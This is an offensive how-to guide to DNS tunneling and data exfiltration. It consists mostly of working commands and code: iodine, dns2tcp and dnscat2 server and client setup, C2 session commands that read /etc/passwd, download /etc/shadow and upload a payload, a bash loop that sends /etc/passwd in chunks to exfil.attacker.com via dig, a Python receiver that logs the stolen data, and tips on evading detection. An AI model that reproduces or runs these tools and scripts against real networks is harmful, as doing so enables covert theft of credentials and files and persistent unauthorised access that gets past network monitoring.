# DNS Tunneling and Exfiltration Guide

## Introduction

DNS tunneling exploits the fact that DNS traffic on port 53 is almost universally allowed through firewalls and rarely subjected to deep packet inspection. In restricted networks where HTTP/HTTPS is blocked, monitored, or filtered through captive portals, DNS queries continue to flow freely to external resolvers. By encoding data within DNS queries and responses, attackers can establish bidirectional communication channels that bypass network restrictions entirely. This guide covers three primary tunneling tools -- iodine for IP-over-DNS connectivity, dns2tcp for TCP service forwarding, and dnscat2 for encrypted command-and-control -- along with custom data exfiltration techniques that encode sensitive information into DNS query labels.

The fundamental principle behind DNS tunneling is that DNS queries can carry arbitrary data in the subdomain labels. A query for `aGVsbG8gd29ybGQ.tunnel.attacker.com` appears to be a standard DNS lookup, but the subdomain label `aGVsbG8gd29ybGQ` is actually base64-encoded data. The attacker's authoritative nameserver receives the query, extracts the data from the subdomain, and logs or processes it. The DNS response can carry data back to the client through TXT, CNAME, or NULL record types. This bidirectional channel enables full tunneling when combined with appropriate encoding and protocol handling.

---

## iodine: IP-over-DNS Tunneling

iodine creates a virtual network interface that tunnels all IP traffic through DNS queries, providing full network connectivity through DNS alone.

### Prerequisites

- An attacker-controlled domain (e.g., `tunnel.attacker.com`) with DNS delegation configured to point to the iodine server's IP address
- The iodine server must be reachable as the authoritative nameserver for the tunnel domain
- The target network must allow outbound DNS queries to the internet

### Server Setup

```bash
# Start iodine server on attacker infrastructure
# 10.0.0.1 is the tunnel IP assigned to the server
# tunnel.attacker.com is the delegated tunnel domain
iodined -f -P secretpassword 10.0.0.1/24 tunnel.attacker.com

# With debug output for troubleshooting
iodined -f -P secretpassword -d 10.0.0.1/24 tunnel.attacker.com

# With custom MTU for better performance
iodined -f -P secretpassword -m 1000 10.0.0.1/24 tunnel.attacker.com
```

### Client Connection

```bash
# Connect from restricted network
iodine -f -P secretpassword dns.attacker.com tunnel.attacker.com

# Specify external DNS server if default is blocked
iodine -f -P secretpassword -s 8.8.8.8 tunnel.attacker.com

# After connection, verify tunnel interface
ip addr show dns0
# Should show 10.0.0.2 or similar

# Test connectivity through tunnel
ping 10.0.0.1

# Route traffic through tunnel
ip route add 192.168.100.0/24 via 10.0.0.1 dev dns0
```

### Performance Tuning

iodine supports multiple DNS query types that affect performance and stealth. The default mode uses NULL records for maximum throughput, but TXT and CNAME records may be preferable in environments where NULL records are filtered. iodine automatically negotiates the best available method, but operators can force specific query types. Typical bandwidth through iodine ranges from 20-100 KB/s depending on DNS latency and query size limits.

---

## dns2tcp: TCP Forwarding over DNS

dns2tcp forwards specific TCP services over DNS rather than providing full IP connectivity, making it lighter and more targeted than iodine.

### Server Configuration

```bash
# Create dns2tcp server configuration
cat > dns2tcp.conf << 'EOF'
listen = 0.0.0.0
port = 53
user = nobody
chroot = /var/empty
domain = tunnel.attacker.com
resources = ssh:127.0.0.1:22,
            http:127.0.0.1:80,
            smtp:127.0.0.1:25,
            rdp:127.0.0.1:3389
EOF

# Start server
dns2tcpd -f dns2tcp.conf
```

### Client Usage

```bash
# Forward SSH through DNS tunnel
dns2tcpc -z tunnel.attacker.com -r ssh -l 2222
# Then: ssh -p 2222 user@localhost

# Forward HTTP
dns2tcpc -z tunnel.attacker.com -r http -l 8080
# Then: curl http://localhost:8080

# Specify DNS server
dns2tcpc -z tunnel.attacker.com -r ssh -l 2222 -s 8.8.8.8
```

dns2tcp is ideal when only specific services are needed rather than full network access. It generates less DNS traffic than iodine and is easier to configure for targeted use cases.

---

## dnscat2: Encrypted Command and Control

dnscat2 provides an encrypted, persistent C2 channel specifically designed for red team operations and long-term access maintenance.

### Server Setup

```bash
# Start dnscat2 server with shared secret
ruby dnscat2.rb --secret=secretkey tunnel.attacker.com

# Without encryption (for testing only)
ruby dnscat2.rb --security=open tunnel.attacker.com
```

### Client Connection

```bash
# Connect from compromised host
./dnscat --secret secretkey tunnel.attacker.com

# With specific DNS server
./dnscat --dns 8.8.8.8 --secret secretkey tunnel.attacker.com
```

### Server Commands

```bash
# List active sessions
sessions

# Interact with session
session -i 1

# Execute commands on remote host
exec ifconfig
exec cat /etc/passwd
exec whoami

# Port forwarding through session
listen 127.0.0.1:8888 10.0.0.5:80

# File transfer
download /etc/shadow
upload payload.sh /tmp/payload.sh

# Stealth adjustments
delay 5000          # 5 second delay between queries
set dns_type TXT    # Use TXT record type instead of default
```

dnscat2's encryption prevents network monitoring from inspecting tunnel contents, and its configurable query delay helps blend with normal DNS traffic patterns.

---

## Custom DNS Data Exfiltration

For targeted exfiltration without full tunneling, custom scripts encode data directly into DNS query labels.

### Exfiltration Concept

1. Read data from target system
2. Encode data (hex, base32, or base64) into DNS-safe characters
3. Chunk encoded data into labels (max 63 characters per label)
4. Send each chunk as a DNS query to an attacker-controlled domain
5. Attacker's nameserver logs the queries and extracts the data
6. Reassemble chunks using sequence numbers

### Exfiltration Script

```bash
# Encode and transmit file in chunks
FILE="/etc/passwd"
DOMAIN="exfil.attacker.com"

cat "$FILE" | xxd -p | fold -w 30 | awk '{printf "%d.%s.%s\n", NR, $0, "'"$DOMAIN"'"}' | \
  while read query; do
    dig "$query" @attacker_dns +short > /dev/null
    sleep 0.3
  done
```

### Receiver Server

A simple Python DNS server that logs all queries for later extraction:

```python
from dnslib import DNSRecord, QTYPE, RR, A
from dnslib.server import DNSServer, BaseResolver
import datetime

class ExfilResolver(BaseResolver):
    def resolve(self, request, handler):
        qname = str(request.q.qname)
        timestamp = datetime.datetime.now().isoformat()
        with open('exfiltrated.log', 'a') as f:
            f.write(f'{timestamp} {qname}\n')
        reply = request.reply()
        reply.add_answer(RR(qname, QTYPE.A, rdata=A('127.0.0.1'), ttl=60))
        return reply

resolver = ExfilResolver()
server = DNSServer(resolver, port=53, address='0.0.0.0')
server.start()
```

### Detection Evasion

To reduce detection risk: randomize query intervals, use base32 encoding (produces DNS-safe characters without special symbols), distribute queries across multiple subdomains, limit chunk size to avoid unusually long labels, and throttle bandwidth to stay below monitoring thresholds.

---

## Operational Considerations

- DNS tunneling generates significantly more queries than normal DNS traffic, which can trigger alerts in environments with DNS monitoring
- iodine provides full IP connectivity but is the noisiest option; dns2tcp is more targeted; dnscat2 is the stealthiest with configurable delays
- Always test DNS connectivity before attempting tunneling: verify that the target network allows outbound DNS to external resolvers
- Tunnel performance is limited by DNS latency and query size constraints (typically 253 characters total per domain name)
- Keep tunnel sessions short and bandwidth-limited during engagements to minimize detection risk

---

## References

- iodine documentation: https://code.kryo.se/iodine/
- dns2tcp GitHub: https://github.com/alex-sector/dns2tcp
- dnscat2 GitHub: https://github.com/iagox86/dnscat2
- DNS Tunneling Detection (SANS): https://www.sans.org/white-papers/dns-tunneling/
- RFC 1035 (DNS protocol): https://www.rfc-editor.org/rfc/rfc1035
- HackTricks DNS Tunneling: https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
